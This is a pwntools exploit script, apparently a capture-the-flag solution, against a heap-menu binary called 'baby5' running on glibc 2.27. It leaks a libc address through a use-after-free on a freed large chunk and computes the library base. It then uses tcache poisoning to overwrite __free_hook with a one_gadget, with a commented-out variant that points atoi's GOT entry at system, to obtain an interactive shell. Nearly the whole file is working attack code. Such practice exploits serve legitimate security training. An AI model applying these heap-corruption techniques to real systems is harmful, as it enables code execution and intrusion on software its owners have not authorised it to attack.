from pwn import *

elf = ELF("./baby5")
libc = ELF("./sysroot/lib/x86_64-linux-gnu/libc.so.6") # libc 2.27

datalist = 0x6020c0
mainarena_top_off = 0x60
libc_mainarena_off = 0x3ebc40

def _select(proc,sel,c=b"> "):
    proc.recvuntil(c)
    proc.sendline(sel)


def add(proc,size,data=b"AAAA"):
    _select(proc, b"1")
    log.info("add")
    proc.recvuntil(b"size: ")
    proc.sendline(str(size).encode())
    proc.recvuntil(b"data: ")
    proc.send(data)

def delete(proc,idx):
    _select(proc,b"3")
    log.info("delete")
    proc.recvuntil(b"item: ")
    proc.sendline(str(idx).encode())

def show(proc,idx):
    _select(proc,b"4")
    log.info("show")
    proc.recvuntil(b"item: ")
    proc.sendline(str(idx).encode())
    proc.recvuntil(b"data: ")
    data = proc.recvline()
    return data

def edit(proc,idx,size,data):
    _select(proc,b"2")
    log.info("edit")
    proc.recvuntil(b"item: ")
    proc.sendline(str(idx).encode())
    proc.recvuntil(b"size: ")
    proc.sendline(str(size).encode())
    proc.recvuntil(b"data: ")
    proc.send(data)

script = '\n'.join(
        [
    "set sysroot ./sysroot",
    "break *0x400942", # main
    "break *0x4009d6", # before malloc
    "break *0x400be3", # before free
    "break *0x400b39", # before read
    "continue",
            ])
#shell = ssh(host = "192.168.122.219",user="test")
#p = gdb.debug(['./baby5'],ssh=shell,sysroot="./sysroot",gdbscript=script)
#p = gdb.debug(elf.path,gdbscript = script)
#p = process(elf.path)
p = gdb.debug(['./baby5'],sysroot="./sysroot",gdbscript=script)

#p = remote("192.168.122.219",9002)


add(p,0x500) # idx = 0
add(p,0x500) # idx = 1
delete(p,0)
addr_mainarena_top = u64(show(p,0)[:-1] + b"\x00\x00")
log.info("addr_mainarena_top = " + hex(addr_mainarena_top))
addr_libc_base = addr_mainarena_top - mainarena_top_off - libc_mainarena_off
log.info("addr_libc_base = " + hex(addr_libc_base))
addr_free_hook = addr_libc_base + libc.symbols["__free_hook"]
addr_one_gadget = addr_libc_base + 0x4f322
addr_system = addr_libc_base + libc.symbols["system"]

## tcache poisoning
## .got.plt(atoi) <- system
#add(p,0x20) # idx = 2
#add(p,0x20) # idx = 3
#delete(p,2)
#delete(p,3)
#edit(p,3,8,p64(elf.got['atoi']))
#add(p,0x20) # idx = 4
#add(p,0x20,data=p64(addr_system)) # idx = 5 # .got.plt(atoi)

# tcache poisoning
# __free_hook <- one_gadget
add(p,0x20) # idx = 2
add(p,0x20) # idx = 3
delete(p,2)
delete(p,3)
edit(p,3,8,p64(addr_free_hook))
add(p,0x20)
add(p,0x20,data=p64(addr_one_gadget))

# free
delete(p,0)

p.interactive()
